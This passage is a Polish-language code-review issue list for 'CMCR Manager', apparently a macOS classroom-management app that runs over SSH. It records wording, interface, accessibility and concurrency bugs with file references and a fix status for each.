Sekcja Dysk pokazuje „%.0f GB wolne z %.0f GB”. Przy typowych wartościach (≥5 GB) liczebnik wymaga „wolnych”, a dla 1 GB „wolny”. W linii 85 etykieta „Szyfrowanie dysku” (rodzaj nijaki) ma wartości „włączony”/„wyłączony” (linie 87–88), a powinno być „włączone”/„wyłączone”.

**Status:** otwarte

### TXT-14

**Instrukcja „Nagrywanie ekranu” pomija /usr/libexec/sshd-session** – P2, Teksty, `Sources/CMCRManager/ReadinessView.swift:279`

Instrukcja krok po kroku („Otwórz instrukcję”, ManualStep.screenRecording, linie 276–280) każe dodać tylko /usr/libexec/sshd-keygen-wrapper, a przycisk kopiowania kopiuje tylko tę ścieżkę (311). README:78, szczegół komórki (Scripts+Setup.swift:233), komunikat podglądu (ScreenCapture.swift:149) i skrypt (setup:929) mówią, że na nowszym macOS (OpenSSH 9.8+, sshd-session) trzeba dodać także /usr/libexec/sshd-session. Nauczyciel postępujący według instrukcji z aplikacji zostaje na macOS 15+ z podglądem samej tapety.

**Status:** otwarte

### TXT-15

**W oknie pojawia się skrócona etykieta CLI stanu („offline”, „online”, „błąd”)** – P2, Teksty, `Sources/CMCRManager/RemoteBrowserComponents.swift:271`; także: `Sources/CMCRManager/PowerView.swift:354`

Okno konsekwentnie używa Reachability.displayName („Włączony”, „Niedostępny”, „Błąd połączenia”, „Nie sprawdzono” – Components.swift:31; komentarz: „the CLI keeps the short label”). W kilku miejscach trafia tam jednak `.label` z CLI. Selektor komputera w Przeglądarce plików pokazuje „imac04 (offline)” i „imac04 (błąd)”. Arkusz potwierdzenia zasilania pokazuje „pominięty – offline” (PowerView.swift:354), choć ConfirmSheet pisze „pominięty – niedostępny” (Components.swift:178). Duży kafelek podglądu pokazuje „offline” pod „Komputer nie odpowiada” (ScreenCenter.swift:395). Raport CSV zapisywany z okna ma w kolumnie „Stan” wartości „online”, „offline”, „nieznany”, „błąd” (Classroom.swift:605).

**Status:** otwarte

### TXT-16

**Trzy różne nazwy opcji macOS „pełny dostęp do dysku dla użytkowników zdalnych”** – P2, Teksty, `Sources/CMCRManager/RemoteBrowserComponents.swift:400`

Tę samą opcję z Ustawień systemowych, którą nauczyciel musi znaleźć przy iMacu, opisano w cudzysłowie na trzy sposoby. (1) „Zezwalaj zdalnym użytkownikom na pełny dostęp do dysku” – tutaj i w README:171. (2) „Daj użytkownikom zdalnym pełny dostęp do dysku” – README:77, ReadinessView.swift:275, Scripts+Setup.swift:46 i 250, setup/cmcr-imac-setup.sh:920 i 922. (3) „Pełny dostęp do dysku dla zdalnych użytkowników” – Scripts.swift:303, 321, 791, 821, 922, przy czym ścieżka pomija tam krok ⓘ. Ta sama opcja ma w różnych miejscach różne nazwy, a co najmniej dwie z nich nie są dosłowną etykietą z macOS.

**Status:** otwarte

### TXT-17

**Tytuły zadań przeglądarki: „Usuń/Pobierz/Wyślij 3 elementów”** – P2, Teksty, `Sources/CMCRManager/RemoteBrowserModel.swift:260`; także: `Sources/CMCRManager/RemoteBrowserModel.swift:259`, `Sources/CMCRManager/RemoteBrowserView.swift:373`

`what` jest ręcznie sklejane jako "\(n) elementów" (linie 259, 270, 292) i trafia do tytułów zadań „Usuń \(what) z …” (260), „Pobierz \(what) z …” (272) i „Wyślij \(what) → …” (293). Dla n = 2–4 i 22–24 wymagany jest biernik „elementy”. Błędny tytuł widać w Zadaniach, w historii, w actions.log i w toście „Uruchomiono „Usuń 3 elementów z /Users/student/Desktop” na 1 komputerze”. Aktywność „Usuwanie 3 elementów…” (dopełniacz) jest poprawna.

**Status:** naprawione (fe7f85a)

### TXT-19

**Uaktualnienie aplikacji nazwane „aktualizacją”** – P2, Teksty, `Sources/CMCRManager/Updater.swift:174`

README i UI rozróżniają „uaktualnienia” CMCR Manager („Sprawdź uaktualnienia…”, „Uaktualnienia CMCR Manager”) od „aktualizacji” macOS (dział Aktualizacje). Toast po udanej instalacji brzmi jednak „Zaktualizowano do wersji X”, a szczegół gotowości (Scripts+Setup.swift:270) każe „zaktualizuj CMCR Manager”.

**Status:** otwarte

### TXT-20

**Pomoc cmcrctl: ustawienie „Równoległe operacje” nie istnieje, formatowanie niespójne** – P2, Teksty, `Sources/cmcrctl/CLI.swift:69`

Pomoc -j odsyła do „„Równoległe operacje” z ustawień”, a w aplikacji to ustawienie nazywa się „Komputery obsługiwane naraz” (SetupView.swift:882). Do tego w `cmcrctl --help` brakuje pustego wiersza przed nagłówkiem „Instalacja i inne” (Legacy.swift:161), nagłówek „Zajęcia, zasilanie i raporty:” jako jedyny ma dwukropek (ClassroomCommands.swift:7), a wiersz `selftest` jest przesunięty o kolumnę (CLI.swift:65).

**Status:** otwarte

### TXT-22

**cmcrctl: „Zakończono: 3 cykli, 1 nowych obrazów” i „1 błędów składni”** – P2, Teksty, `Sources/cmcrctl/ScreenWatch.swift:52`

Podsumowanie screen-watch skleja liczebniki ręcznie. Domyślne --frames 3 daje „3 cykli”, a istniejący test e2e (Tests/e2e/suites/screens.sh:86: 3 klatki, 1 nowa) wypisuje „Zakończono: 3 cykli, 1 nowych obrazów.”. Poprawnie: „3 cykle, 1 nowy obraz”. Tak samo CLI.swift:637 („selftest: 1 błędów składni”, „2 błędów”) i :640 („N skryptów” – dziś 89, poprawnie, ale nie dla 92–94).

**Status:** otwarte

### TXT-23

**Raport skryptu konfiguracyjnego: „Zainstalowano Rosetta 2”, „wpis(ów)”, „klucz menedżera”** – P2, Teksty, `setup/cmcr-imac-setup.sh:836`

(1) Brak odmiany nazwy: „Zainstalowano Rosetta 2.” (836), „Instalacja Rosetta 2 nie powiodła się” (837), „zainstalować Rosetta 2.” (834), „--rosetta zainstaluj Rosetta 2” (88). Aplikacja odmienia: „Zainstaluj Rosettę 2” (SetupOptionsSheet.swift). (2) Liczebniki z nawiasami: „jest już 3 wpis(ów)” (466), „zapis 1 klucza(y)” (514). (3) „Klucz SSH menedżera” (521–524), a aplikacja mówi „klucz SSH aplikacji”. (4) „(stan pokaże CMCR Manager: Konfiguracja › Przygotowanie iMaców › Sprawdź)” (929) – przycisk to „Sprawdź wszystkie” (ReadinessView.swift:396).

**Status:** otwarte

### TXT-24

**Folder /Applications nazywany raz „Programy”, raz „Aplikacje”; aktualny polski macOS pokazuje „Aplikacje”** – P2, Teksty, `Sources/CMCRManager/SetupOptionsSheet.swift:421`

Ten sam folder /Applications ma w aplikacji dwie nazwy. „Programy”: InstallView.swift:55 („Aplikacje trafią do folderu Programy”), AppsView.swift:287/316/317, ulubione Przeglądarki i wyboru folderu RemoteBrowse.swift:266, instrukcja SetupOptionsSheet.swift:421 („otwórz Terminal (Programy › Narzędzia)”), README:11. „Aplikacje”: SelfUpdate.swift:649/652 i README:190. Aktualny polski macOS pokazuje w Finderze „Aplikacje” (sprawdzone na 27.0.1: SystemFolderLocalizations pl, Applications => „Aplikacje”, Utilities => „Narzędzia”). Nauczyciel przy iMacu z aktualnym macOS, który idzie za instrukcją zapisu skryptu, szuka folderu „Programy › Narzędzia”, którego w Finderze nie ma. W Przeglądarce plików widzi ulubiony folder pod inną nazwą niż w Finderze.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### UI-01

**⌘, przypisany trzem pozycjom menu – skrót opisany przy „Ustawienia…” nie otwiera okna Ustawień** – P2, Interfejs, `Sources/CMCRManager/App.swift:70`; także: `README.md:182`, `Sources/CMCRManager/App.swift:68`

CommandGroup(replacing: .appSettings) usuwa standardową pozycję „Ustawienia…” sceny Settings i wstawia „Konfiguracja…” (⌘,), która tylko przełącza dział w głównym oknie. Okno Ustawień (AppSettingsWindow) da się otworzyć wyłącznie linkiem na dole Konfiguracja › Ustawienia (SetupView.swift:786). README i teksty w aplikacji (SetupView.swift:789 „(⌘,)”, 792 „z menu CMCR Manager › Ustawienia… (⌘,)”) opisują nieistniejącą pozycję. Skutek uboczny: SnapshotRenderer.captureSettings (SnapshotRenderer.swift:155-165) wybiera pozycję z ⌘, – okno Ustawień się nie otwiera, wpis „settings” kończy się komunikatem „Brak okna Ustawień” i nie powstaje zrzut okna Ustawień wymagany w Etapie 3. Dodatkowo ⌘, jest przypisany dwóm pozycjom (App.swift:70 i Przejdź › Konfiguracja, App.swift:81). To regresja z równoległych commitów 776e90c (okno Ustawień ⌘,) i ba73c33 (Konfiguracja… ⌘,).

**Status:** otwarte

### UI-05

**„Wczytaj listę z pliku…” zastępuje całą listę komputerów bez potwierdzenia** – P2, Interfejs, `Sources/CMCRManager/SetupView.swift:378`

importHosts() od razu wykonuje model.machines = hosts (didSet natychmiast zapisuje hosts.json) – bez potwierdzenia i bez oznaczenia akcji jako niszczącej (pozycja menu ze zwykłą ikoną square.and.arrow.down, SetupView.swift:299-303). Wybranie złego pliku nieodwracalnie kasuje grupy, notatki, adresy MAC, porty i ustawienia haseł bieżącej listy; własne hasła usuniętych wpisów zostają w Pęku kluczy (askDelete, 364, je czyści). Generator (askReplace, 506-516) i CLI (README: zastępowanie listy pyta o potwierdzenie) wymagają potwierdzenia.

**Status:** otwarte

### UI-06

**Usunięty standardowy przycisk paska bocznego i wymuszany tryb paska narzędzi** – P2, Interfejs, `Sources/CMCRManager/App.swift:158`

.toolbar(removing: .sidebarToggle) usuwa systemowy przycisk pokazywania/ukrywania paska bocznego (bo przy wymuszonych podpisach nie mieścił się). Po ukryciu paska (⌃⌘S lub przeciągnięciem) nie ma widocznej kontrolki, by go przywrócić – tylko Widok › Pokaż pasek boczny. ToolbarTitlesShown (MainToolbar.swift:84-88) przy każdym uruchomieniu wymusza tryb „ikona i tekst”, nadpisując wybór użytkownika z poprzedniej sesji.

**Status:** otwarte

### UI-07

**Lista uruchomionych aplikacji nie wczytuje się dla komputerów zaznaczonych po wejściu w dział** – P2, Interfejs, `Sources/CMCRManager/AppsView.swift:40`

refreshRunningApps jest wywoływane tylko w onAppear (AppsView.swift:39-41) i przyciskiem „Odśwież listę”. Komputery zaznaczone później trafiają do grupy „Wczytywanie listy…” z klepsydrą (AppsView.swift:191-192), choć nic się nie wczytuje. Błędy listy zainstalowanych są pomijane (AppModel.swift:823 – komputer po prostu nie jest liczony do „Sprawdzono N komputerów”).

**Status:** otwarte

### UI-08

**Ta sama akcja lub ten sam stan oznaczane różnymi symbolami** – P2, Interfejs, `Sources/CMCRManager/ClassroomView.swift:496`; także: `Sources/CMCRManager/AppModel.swift:36`, `Sources/CMCRManager/PowerView.swift:155`

„Przerwij”: stop.circle (Components.swift:536/700, ActivityViews.swift:193) i xmark.circle w scenariuszu zajęć (ClassroomView.swift:496). Tryb uwagi: eye.slash (zakładka i nagłówek, ClassroomView.swift:24/613) i lock.fill (przyciski i wskaźniki, ClassroomView.swift:110/591/606, DashboardView.swift:262). Wake-on-LAN: sunrise (Obudź), dot.radiowaves.left.and.right (ReadinessView.swift:435/807, SetupOptionsSheet.swift:206), network (EnergyScheduleView.swift:73). Stan „niedostępny”: moon.zzz.fill (Components.swift:22, DashboardView.swift:162), moon.zzz (ScreenTiles.swift:151), wifi.slash (ReadinessView.swift:484, RemoteBrowserComponents.swift:386, HostTrustSheet.swift:128). Włączanie po zaniku zasilania: bolt.circle (EnergyScheduleView.swift:64) i bolt.fill (SetupOptionsSheet.swift:212). „Hasło tego komputera…”: key (SetupView.swift:233) i key.fill (ReadinessView.swift:797/802). Uprawnienia administratora: lock.shield (Przeglądarka) i lock.fill (CommandsView.swift:112). Import i eksport tym samym square.and.arrow.down („Wczytaj listę z pliku…” SetupView.swift:302, „Zapisz skrypt do pliku…” ReadinessView.swift:422).

**Status:** otwarte

### UI-10

**Niespójna terminologia: „sekcja” zamiast „dział”, „Zaktualizowano” dla uaktualnienia aplikacji, „Pobrane rzeczy” vs „Pobrane”** – P2, Interfejs, `Sources/CMCRManager/ClassroomView.swift:859`

README i reszta UI mówią „dział” („w dziale Zadania”), a ClassroomView.swift:859 „(sekcja Aplikacje)” i ScreenControls.swift:221 „Pokaż wyniki w sekcji Zadania”. README i menu rozróżniają Aktualizacje (iMaki) i Uaktualnienia (CMCR Manager), a toast po instalacji brzmi „Zaktualizowano do wersji X” (Updater.swift:174). Folder Downloads: „Pobrane rzeczy” (SetupOptionsSheet.swift:420) i „Pobrane” (ClassroomView.swift:361, 405; Sources/CMCRCore/RemoteBrowse.swift:261).

**Status:** otwarte

### UI-12

**Przykładowy komunikat w zrzutach UI podaje nieistniejący plik „hosts.json.damaged”** – P2, Interfejs, `Sources/CMCRManager/ConfigIssuesAlert.swift:48`

Tekst dla SnapshotRenderer (podstrona configissues) mówi „Oryginał zachowano jako hosts.json.damaged”, a ConfigStore zapisuje kopię jako <nazwa>.<data>.bak (Sources/CMCRCore/Store.swift:63, 163; README: „*.bak”). Zrzuty w docs/ui-review pokażą nieprawdziwą informację.

**Status:** otwarte

### UI-13

**Tabela działu Komputery z otwartym panelem szczegółów nie mieści się w oknie 1180 pt** – P2, Interfejs, `Sources/CMCRManager/DashboardView.swift:65`

Domyślnie widoczne kolumny mają minimalne szerokości 60+95+70+90+45+80 = 440 pt (DashboardView.swift:255-334). Przy minimalnym oknie 1180 pt (pasek boczny 190–210, lista 250–290) i inspektorze 260–310 pt (DashboardView.swift:67) na tabelę zostaje ok. 330–390 pt po marginesach 2×20 – pojawia się przewijanie poziome, a kolumna „Uwagi” z komunikatami błędów jest poza widokiem. Komentarz (288) zakłada dopasowanie do 1180 pt tylko bez inspektora, a stan inspektora jest zapamiętywany (@AppStorage dashboardInspector).

**Status:** otwarte

### UI-14

**Błędy zapisu i otwierania sygnalizowane tylko dźwiękiem albo przemilczane** – P2, Interfejs, `Sources/CMCRManager/JobsView.swift:666`; także: `Sources/CMCRManager/AppModel.swift:778`, `Sources/CMCRManager/ClassroomModel.swift:596`, `Sources/CMCRManager/ClassroomModel.swift:606`, `Sources/CMCRManager/SetupView.swift:306`

Bez komunikatu dla użytkownika: zapis eksportu wyników zadań (JobsView.swift:666), brak dziennika działań (JobsView.swift:159), zapis raportu CSV i odpowiedzi/wersji (ClassroomModel.swift:596, 606), zapis zrzutu ekranu (ScreenTiles.swift:319, 329), otwarcie sesji SSH w Terminalu (AppModel.swift:698), przygotowanie folderów all/<komputer> (AppModel.swift:778), rozsyłanie klucza bez pliku .pub (AppModel.swift:909), niepoprawna nazwa w „Nowy folder”/„Zmień nazwę” – alert znika razem z wpisaną nazwą (RemoteBrowserComponents.swift:460). Eksport listy komputerów try? ConfigStore.exportHosts (SetupView.swift:306) nie daje nawet dźwięku. Np. zapis eksportu na wolumin tylko do odczytu kończy się samym „bip”.

**Status:** otwarte

### UI-15

**„najwyżej N komputerów naraz” – zła odmiana dla N = 1…4** – P2, Interfejs, `Sources/CMCRCore/LessonRoutine.swift:169`

Limit pochodzi z settings.maxParallel (zakres 1…32, SetupView.swift:879; ClassroomModel.swift:288). Przy limicie 2–4 wynik scenariusza zajęć mówi „Czekam na swoją kolej (najwyżej 3 komputerów naraz)…”, a przy limicie 1 – „najwyżej 1 komputerów”.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### UI-16

**„Zmień ograniczenia…” otwiera Konfigurację na zakładce Komputery zamiast ustawień podglądu** – P2, Interfejs, `Sources/CMCRManager/ScreenControls.swift:49`

SetupView trzyma zakładkę w @ViewState (SetupView.swift:30), więc każde wejście do działu zaczyna od „Komputery”. Odnośnik „Zmień ograniczenia…” z paska podglądu i Ściany ekranów (ScreenControls.swift:48-51) ustawia tylko model.section = .setup – ustawienia prywatności podglądu są w zakładce Ustawienia (lub w oknie Ustawień › Podgląd ekranów). Tak samo powrót do Konfiguracji po sprawdzeniu wyników w Zadaniach gubi wybraną zakładkę.

**Status:** otwarte

### UI-17

**„Szczegóły” w banerze podglądu i pasku Przeglądarki otwiera Zadania bez wskazania właściwego działania** – P2, Interfejs, `Sources/CMCRManager/ScreenControls.swift:217`; także: `Sources/CMCRManager/RemoteBrowserView.swift:219`

Oba odnośniki ustawiają tylko model.section = .jobs (ScreenControls.swift:217, RemoteBrowserView.swift:219). JobsView wybiera najnowsze działanie tylko gdy focusedBatchID == nil (JobsView.swift:71), więc jeśli wcześniej oglądano inne działanie, kliknięcie „Szczegóły” przy „Wiadomość – nie powiodło się na 2 z 10” pokazuje stare wyniki. Toast i BatchResultsView używają poprawnie model.showJobs(batch.id).

**Status:** otwarte

### UI-18

**Animacje przesunięcia i skalowania ignorują ustawienie „Ogranicz ruch”** – P2, Interfejs, `Sources/CMCRManager/ScreenControls.swift:238`

Tylko ActionToastOverlay (ActivityViews.swift:44-54) sprawdza accessibilityReduceMotion. Bez sprawdzenia: baner wyniku podglądu .move(edge: .bottom) (ScreenControls.swift:238), powiększanie ekranu .scale + .animation (ScreenGrid.swift:116-119) i animowane przewijanie (ScreenGrid.swift:90), baner uaktualnienia (UpdateViews.swift:24, 56), toast po uaktualnieniu .move(edge: .top) (UpdateViews.swift:431), przewijanie do postępu zajęć (ClassroomView.swift:90).

**Status:** otwarte

### UI-19

**Świeżość obrazu i zaznaczenie kafelka w podglądzie rozróżniane tylko kolorem** – P2, Interfejs, `Sources/CMCRManager/ScreenTiles.swift:268`

FreshnessBadge pokazuje zawsze circle.fill – zielony/pomarańczowy/czerwony (aktualny/opóźniony/stary); tekst wieku nie mówi, który próg przekroczono. Obramowanie kafelka (ScreenTiles.swift:544-549) sygnalizuje zaznaczenie (accent), problem (czerwony/pomarańczowy) i nieaktualność (pomarańczowy) tylko kolorem i grubością. Także „mało miejsca” w kolumnie Wolne miejsce (DashboardView.swift:417-421) tylko kolorem. Stany Reachability, Job, Readiness i StepState mają osobne kształty – tu tego brakuje.

**Status:** otwarte

### UI-20

**Ikona „Pełny ekran” w Ścianie ekranów wymaga macOS 15 – na macOS 14 przycisk jest bez ikony** – P2, Interfejs, `Sources/CMCRManager/ScreenWall.swift:230`

arrow.up.left.and.arrow.down.right.rectangle pochodzi z SF Symbols 6 (name_availability.plist: 2024 → macOS 15.0), a cel aplikacji to macOS 14 (Package.swift, LSMinimumSystemVersion 14.0). Na macOS 14 Label pokaże pusty obrazek. Wszystkie pozostałe użyte nazwy symboli (sprawdzone NSImage(systemSymbolName:) i name_availability) są dostępne od macOS ≤ 14.0.

**Status:** otwarte

### UI-21

**Menu i menu kontekstowe mieszają pozycje z ikonami i bez ikon** – P2, Interfejs, `Sources/CMCRManager/ScreenWall.swift:414`

W menu z ikonami są pozycje tylko tekstowe: „Podgląd ekranu w nowym oknie” (ScreenWall.swift:414, w MachineContextMenu App.swift:657), „Pokaż szczegóły” (DashboardView.swift:235), „Wstrzymaj podgląd ekranów” obok „Ściana ekranów” z ikoną w menu Okno (ScreenWall.swift:399/401), menu „Wstaw polecenie” z ikoną tylko przy poleceniach root (CommandsView.swift:111-115). Menu całkowicie tekstowe przy menu Przejdź z ikonami (App.swift:79): Widok/Edycja/aplikacja (App.swift:54, 61, 63, 65, 69; UpdateViews.swift:11), menu grupy (App.swift:433-437), Zaznacz (App.swift:513-524, także menu pustego obszaru listy), menu kontekstowe wyników zadań (JobsView.swift:363, 366, 370) i Eksportuj (JobsView.swift:322, 326).

**Status:** otwarte

### UI-22

**Symbole SF z ograniczeniami Apple użyte niezgodnie z przeznaczeniem** – P2, Interfejs, `Sources/CMCRManager/UpdatesView.swift:54`

Według symbol_restrictions.strings (CoreGlyphs): apple.logo – tylko dla „Sign in with Apple” (nagłówek „Aktualizacje macOS”, UpdatesView.swift:54); safari – tylko dla przeglądarki Safari (nagłówek „Otwórz stronę internetową lub plik”, AppsView.swift:135 – otwiera w domyślnej przeglądarce); iphone.gen2 – tylko dla iPhone’a (przycisk „Zainstaluj Android SDK”, InstallView.swift:215); person.badge.key – tylko dla kluczy dostępu (ulubiony folder „Katalog domowy administratora”, Sources/CMCRCore/RemoteBrowse.swift:267); macbook – tylko dla MacBooka („Folder na tym Macu”, SetupView.swift:830 – Mac nauczyciela nie musi nim być).

**Status:** otwarte

### UI-23

**Pomoc › „Pomoc aplikacji CMCR Manager” (⌘?) pokazuje tylko, że pomoc jest niedostępna** – P2, Interfejs, `Sources/CMCRManager/App.swift:49`

Aplikacja nie zastępuje grupy poleceń .help, a pakiet nie ma Księgi pomocy (w Info.plist z scripts/build-app.sh:70-89 brak CFBundleHelpBookName). Menu w zrzucie docs/ui-review/before/setup-light.txt zawiera „Pomoc aplikacji CMCR Manager [⌘?]”. Jej wybór kończy się tylko systemowym komunikatem „Pomoc aplikacji CMCR Manager nie jest dostępna.” (AppKit HelpManager.loctable), mimo że instrukcja istnieje w README – to martwa pozycja menu.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### UI-24

**„Usuń grupę” bez potwierdzenia, niespójne role „Przerwij”, przyciski niszczące tuż obok zwykłych** – P2, Interfejs, `Sources/CMCRManager/App.swift:437`

„Usuń…” w pasku Przeglądarki stoi między „Pobierz…” a „Wyślij tutaj…” (RemoteBrowserView.swift:97-122); „Odinstaluj…” tuż obok „Uruchom” (AppsView.swift:308-324); „Usuń harmonogram…” obok „Zastosuj harmonogram” (EnergyScheduleView.swift:96-99); „Usuń z listy…” obok wyróżnionego „Dodaj komputer” (SetupView.swift:262-276); „Wymuś zamknięcie…” obok „Zamknij” w każdym wierszu (AppsView.swift:438-452). „Przerwij” scenariusza zajęć ma role: .cancel (ClassroomView.swift:493), a „Przerwij” zadań role: .destructive (Components.swift:535). „Usuń grupę” (App.swift:437) zdejmuje grupę ze wszystkich komputerów bez potwierdzenia.

**Status:** otwarte

### UI-25

**Zrzut „settings” w ciemnym motywie pokazuje zakładkę Uaktualnienia zamiast Ogólne** – P2, Interfejs, `Sources/CMCRManager/SetupView.swift:1044`

AppSettingsWindow.onSnapshotSubpage zmienia zakładkę tylko dla znanej nazwy. Pusta podstrona (wpis „settings” bez „:zakładka”) nie przywraca zakładki Ogólne, a okno Ustawień jest używane ponownie w kolejnym przebiegu. W ciemnym przebiegu wpis „settings” następuje po jasnym „settings:updates”, więc docs/ui-review/before/settings-dark.png jest identyczny z settings-updates-dark.png i brakuje zrzutu zakładki Ogólne w ciemnym motywie wymaganego w Etapie 3. SnapshotRenderer.swift:12-13 zapowiada, że pusta podstrona oznacza powrót do domyślnej.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### WSP-03

**Odświeżanie co 2 min działa tylko przy otwartym oknie głównym – sama Ściana ekranów nie dostaje aktualnego stanu** – P2, Współbieżność, `Sources/CMCRManager/App.swift:134`; także: `Sources/CMCRManager/App.swift:135`

Pętla i attach siedzą w .task okna głównego (WindowGroup). Gdy nauczyciel zamknie okno główne i zostawi Ścianę ekranów (np. na projektorze), stan nie jest odświeżany (tylko przy aktywacji aplikacji) – źródło „Tylko włączone”/„Z zalogowanym uczniem” nie pokaże iMaców włączonych później. Odwrotnie: każde nowe okno główne (⌘N) startuje własną pętlę i pełne refreshStatus() – odświeżanie co ~60 s zamiast 120 s, a globalne arkusze (uaktualnienie, potwierdzenie powtórzenia, klucze komputerów, błędy konfiguracji) pokazują się w każdym oknie.

**Status:** otwarte

### WSP-04

**„Przerwij” nie działa w trakcie pakowania plików (tar)** – P2, Współbieżność, `Sources/CMCRManager/AppModel+Jobs.swift:322`

Payload.make uruchamia /usr/bin/tar bez ProcessHandle, a Batch.cancel działa tylko przez handle (zadania nie są anulowane jako Task). Przy instalatorach/folderach rzędu GB po „Przerwij” zadania zostają „W toku”, aż tar zapisze całe archiwum, dopiero potem kończą się jako anulowane. Dotyczy SharedPayload (wysyłanie, instalacja, materiały zajęć), cmcr-push (AppModel.swift:749) i wysyłania w Przeglądarce.

**Status:** otwarte

### WSP-05

**Kliknięcie powiadomienia „Zakończono…” bez okna głównego niczego nie pokazuje** – P2, Współbieżność, `Sources/CMCRManager/AppModel+Jobs.swift:400`

Po zamknięciu okna z trwającymi zadaniami aplikacja działa dalej i po ≥30 s wysyła powiadomienie. Router.didReceive tylko aktywuje aplikację i ustawia section/focusedBatchID – bez okna głównego nic się nie pojawia (brak odpowiednika MainWindow.bringToFront). Delegate centrum powiadomień jest ustawiany dopiero w post(), więc powiadomienia z poprzedniego uruchomienia nie są obsługiwane.

**Status:** otwarte

### WSP-06

**Lista zainstalowanych aplikacji ignoruje błędy i nie pokazuje postępu** – P2, Współbieżność, `Sources/CMCRManager/AppModel.swift:823`

refreshInstalledApps zapisuje wynik tylko przy r.succeeded. Błąd logowania, sudo czy limit 40 s nie zostawia śladu: gdy zawiodą wszystkie komputery, „Pobierz listę” wygląda na martwy przycisk, przy części – komputery znikają z liczników bez wyjaśnienia, a stara lista zostaje bez oznaczenia. refreshRunningApps błędy zapisuje (HostApps.error).

**Status:** otwarte

### WSP-07

**Nowy folder / Zmień nazwę z „/” w nazwie – tylko dźwięk, nazwa przepada** – P2, Współbieżność, `Sources/CMCRManager/RemoteBrowserComponents.swift:460`

W alercie namePrompt nieprawidłowa nazwa (np. „Prace 2024/25”, „.”, „..”) kończy się NSSound.beep(); przycisk alertu i tak zamyka okno, więc wpisany tekst ginie, a nauczyciel nie wie, czemu folder nie powstał.

**Status:** otwarte

### WSP-08

**cmcrctl hosts add/set/remove/generate pisze „Dodano…” i kończy z kodem 0, choć hosts.json nie został zapisany** – P2, Współbieżność, `Sources/cmcrctl/ConfigCommands.swift:54`

ConfigStore.saveHosts (Store.swift:185-198) połyka błąd zapisu (tylko NSLog i nieczytany lastSaveError). Polecenia CLI zmieniające listę komputerów zawsze wypisują komunikat sukcesu i zwracają 0: ConfigCommands.swift:54, 71, 97, 122, 127, 178, rename --update-list w ClassroomCommands.swift:306 i zapis MAC w CLI.swift:350. Przy katalogu konfiguracji bez prawa zapisu (np. utworzonym przez sudo) albo przy pełnym dysku skrypt administratora uzna zmianę za wykonaną, a lista się nie zmieni.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (b5d9416). naprawione razem z KON-03

### WŁ-01

**Menu Pomoc › „Pomoc aplikacji CMCR Manager” (⌘?) nie prowadzi do żadnej pomocy** – P2, Własne, `Sources/CMCRManager/App.swift:46`

Aplikacja nie zastępuje standardowej grupy poleceń .help, a pakiet nie ma książki pomocy (Help Book). Pozycja „Pomoc aplikacji CMCR Manager” (⌘?) w menu Pomoc, widoczna w opisie menu ze zrzutów (docs/ui-review/before/*.txt), pokazuje więc tylko systemowy komunikat, że pomoc nie jest dostępna. Specyfikacją aplikacji jest README na GitHubie – menu Pomoc powinno do niego prowadzić.

**Status:** otwarte

### ZAD-03

**Wynik zdalnego zatrzymania nie trafia do podsumowania ani historii – „Anulowano” nawet gdy polecenie nadal działa** – P2, Zadania, polecenia, `Sources/CMCRManager/AppModel.swift:440`

Po Przerwij lokalne ssh dostaje SIGTERM i SSH.run wraca natychmiast; execute ustawia stan cancelled, summary „Anulowano” i archiwizuje zadanie. Zdalne zatrzymanie (cancelRemote, do ~30 s) kończy się później, a jego komunikat (np. „Nie udało się połączyć, aby zatrzymać polecenie – może ono nadal działać na komputerze” albo „Nie udało się zatrzymać wszystkich procesów…”) jest dopisywany tylko do logu w pamięci. Historia, „Kopiuj wynik” i eksport (fullOutput czyta plik z dysku) go nie zawierają, a kolumna Wynik nadal pokazuje „Anulowano”. Scenariusz: nauczyciel przerywa „softwareupdate --install --restart” na zawieszonym iMacu, zatrzymanie się nie udaje, a aplikacja raportuje przerwanie – iMac restartuje się później. Test e2e __run-job czeka na cancellationFinished(), aplikacja nie.

**Status:** otwarte

### ZAD-04

**Zapis historii może nadpisać cały plik miesiąca jednym wpisem** – P2, Zadania, polecenia, `Sources/CMCRCore/JobHistory.swift:183`

Gdy FileHandle(forWritingTo:) nie otworzy istniejącego jobs-YYYY-MM.jsonl (np. brak prawa zapisu do pliku przy wspólnym CMCR_CONFIG_DIR, przywrócone uprawnienia), kod przechodzi do `line.write(to: file, options: .atomic)`, który przez plik tymczasowy i rename zastępuje cały plik miesiąca tą jedną linią – historia miesiąca znika bez komunikatu.

**Status:** otwarte

### ZAD-05

**Historia: wpisy starsze niż 90 dni widoczne z usuniętym wyjściem, limit 3000 tnie partie** – P2, Zadania, polecenia, `Sources/CMCRCore/JobHistory.swift:246`

purge usuwa katalogi wyjścia po dniu (< dzień graniczny), ale pliki jobs-YYYY-MM.jsonl dopiero gdy cały miesiąc jest starszy – wpisy do ~120 dni zostają na liście „Historia”, a ich wynik pokazuje „(nie można odczytać …/output/2026-07-15/…)”. purge działa tylko przy starcie aplikacji. Do tego load(limit: 3000) ucina po rekordach, nie po partiach – najstarsza wczytana partia ma część komputerów (zła liczba, niepełne „Zaznacz nieudane”).

**Status:** otwarte

### ZAD-06

**Przerwanie tuż po starcie pomija zatrzymanie na iMacu, choć polecenie już ruszyło** – P2, Zadania, polecenia, `Sources/CMCRCore/SSH.swift:424`

Akcja anulowania wywołuje cancelRemote tylko gdy lokalnie odebrano znacznik CMCR:SESSION-STARTED. Jeśli wrapper już go wypisał (i ustawił trap '' HUP), a znacznik jeszcze nie dotarł (okno ~RTT, np. Przerwij zaraz po starcie na 15 iMacach przez Wi-Fi), aplikacja pisze „Polecenie nie zostało uruchomione na komputerze”, zabija lokalne ssh, a skrypt na iMacu – po zarejestrowaniu i z przekaźnikami do /dev/null – wykonuje się do końca. Mechanizm znacznika .cancel (dla rejestracji po anulowaniu) jest w tym przypadku nieużywany.

**Status:** otwarte

### ZAD-07

**Kod 255 lub „ssh:” w stderr działającego polecenia oznacza iMaca jako niedostępny/błąd** – P2, Zadania, polecenia, `Sources/CMCRCore/SSH.swift:681`

